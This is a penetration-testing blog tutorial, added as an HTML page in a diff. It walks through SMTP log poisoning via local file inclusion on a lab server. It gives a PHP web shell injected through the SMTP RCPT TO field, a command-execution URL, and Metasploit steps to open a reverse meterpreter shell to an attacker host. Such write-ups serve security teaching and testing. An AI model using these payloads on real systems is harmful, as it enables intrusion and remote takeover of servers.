@@ -1,0 +1,49 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
+            <h1 class="post-title entry-title">SMTP Log Poisoning through LFI to Remote Code Execution</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/" rel="bookmark"><time class="entry-date published updated" datetime="2019-01-06T15:57:38+00:00">January 6, 2019</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In this Post, we will be discussing on SMTP log poisoning. But before getting in details, kindly read our previous articles for “<span style="color: #3366ff;"><a style="color: #3366ff;" href="https://www.hackingarticles.in/smtp-pentest-lab-setup-ubuntu/">SMTP Lab Set-Up</a></span>” and “<span style="color: #3366ff;">Beginner Guide to File Inclusion Attack (LFI/RFI)</span>”. Today you will see how we can exploit a web server by abusing SMTP services if the webserver is vulnerable to local file Inclusion.</span></p>
+<p><span style="color: #000000;"><strong>Let’s</strong> <strong>Start</strong>!!</span></p>
+<p><span style="color: #000000;">With the help of Nmap, we scan for port 25 and as a result, it shows port 25 is open for SMTP service.</span></p>
+<pre class="lang:default decode:true">nmap -p25 192.168.1.107</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7hOHNfsZhLI/XDIkX_ZyIaI/AAAAAAAAb8U/HUJ0LDA6l00xhv_9M-BFgdU1UKyC2UTCwCEwYBhgL/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">This attack is truly based on Local file Inclusion attack; therefore I took help of our previous <span style="color: #3366ff;"><a style="color: #3366ff;" href="https://www.hackingarticles.in/apache-log-poisoning-through-lfi/">article</a></span> where I Created a PHP file which will allow the user to include a file through file parameter.</span></p>
+<p><span style="color: #000000;">As a result, you can observe that we are able to access <em>/etc/passwd</em> file of the victim machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mZXcez7fPso/XDIkYPkojaI/AAAAAAAAb8Y/IYanVFP2Wg0EVxqOXhSIkNmN2KFdG5HCACEwYBhgL/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">Now if you are able to access the mail.log file due to LFI, it means the mail.log has read and write permission and hence we can infect the log file by injecting malicious code.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-PixryJxxZeE/XDIkYjq29qI/AAAAAAAAb8c/OHwX4qA6E1MyYGRkOtqmSb3BEVZzp_vSgCEwYBhgL/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Now let’s try to enumerate further and connect to the SMTP (25) port</span></p>
+<pre class="lang:default decode:true">telnet 192.168.1.107 25</pre>
+<p><span style="color: #000000;">As we can see, we got connected to the victim machine successfully. Now let’s try to send a mail via the command line (CLI) of this machine and send the OS commands via the “<strong>RCPT TO”</strong> option. Since the mail.log file generates a log for every mail when we try to connect with the webserver. Taking advantage of this feature now I will send malicious PHP code as the fake user and it will get added automatically in the mail.log file as a new log.</span></p>
+<pre class="lang:default decode:true">MAIL FROM:&lt;rrajchandel@gmail.com&gt;
+RCPT TO:&lt;?php system($_GET['c']); ?&gt;</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sEa7XI2bRK8/XDIkY6xtxYI/AAAAAAAAb8g/g6PtBX5TEe8AVOktauZgP4P3xYjpGLcowCEwYBhgL/s1600/5.png"/></span></p>
+<p><span style="color: #000000;"><strong>Note:</strong> <em>We can ignore the 501 5.1.3 Bad recipient address syntax server response as seen in the above screenshot because ideally the internal email program of the server (victim machine), is expecting us to input an email ID and not the OS commands.</em></span></p>
+<p><span style="color: #000000;">As our goal is to inject PHP code into the logs and this stage is called logfile poisoning and we can clearly see that details of mail.log, as well as execute comment given through cmd; now execute<strong> ifconfig</strong> as cmd comment to verify network interface and confirm its result from inside the given screenshot.</span></p>
+<pre class="lang:default decode:true">192.168.1.107/lfi/lfi.php?file=/var/log/mail.log&amp;c=ifconfig</pre>
+<p><span style="color: #000000;">You can observe its output in its source code as shown in the below image:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-vb1aGqQ9Grs/XDIkZYk0OpI/AAAAAAAAb8k/H9nGzdwHy7wfGspMsxbB0Ue4rOCofPdyACEwYBhgL/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">This technique is known as<strong> SMTP log poisoning</strong> and through such type of vulnerability, we can easily take the reverse shell of the victim’s machine. </span></p>
+<p><span style="color: #000000;">Execute following command inside Metasploit:</span></p>
+<pre class="lang:default decode:true">use exploit/multi/script/web_delivery
+msf exploit (web_delivery)&gt;set target 1
+msf exploit (web_delivery)&gt; set payload php/meterpreter/reverse_tcp
+msf exploit (web_delivery)&gt; set lhost 192.168.1.109
+msf exploit (web_delivery)&gt;set lport 8888
+msf exploit (web_delivery)&gt;exploit</pre>
+<p><span style="color: #000000;"><strong>Copy</strong> the <strong>highlighted text</strong> shown in below window</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-5CuiRVNce7Q/XDIkZt-73AI/AAAAAAAAb8o/Nn4LcNDNwVQ8194neNPZiwXno3BwT0AHQCEwYBhgL/s1600/7.png"/></span></p>
+<p><span style="color: #000000;"><strong>Paste </strong>the above copied malicious code inside URL as shown in the given image and <strong>execute</strong> it as cmd comment<strong>.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-itzkcck-F7Q/XDIkZ9rLChI/AAAAAAAAb8s/D3NvuLtnJrAegS_mo3pSjc-q1lzwQk4nQCEwYBhgL/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">When the above code gets executed you will get meterpreter session 1 of the targeted web server.</span></p>
+<pre class="lang:default decode:true ">msf exploit (web_delivery)&gt;sessions 1
+meterpreter&gt; sysinfo</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-vaDqFvMs364/XDIkaGSOidI/AAAAAAAAb8w/StmbOIpOWTs0bPrs_T3eWS14EwxBRxJEgCEwYBhgL/s1600/9.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
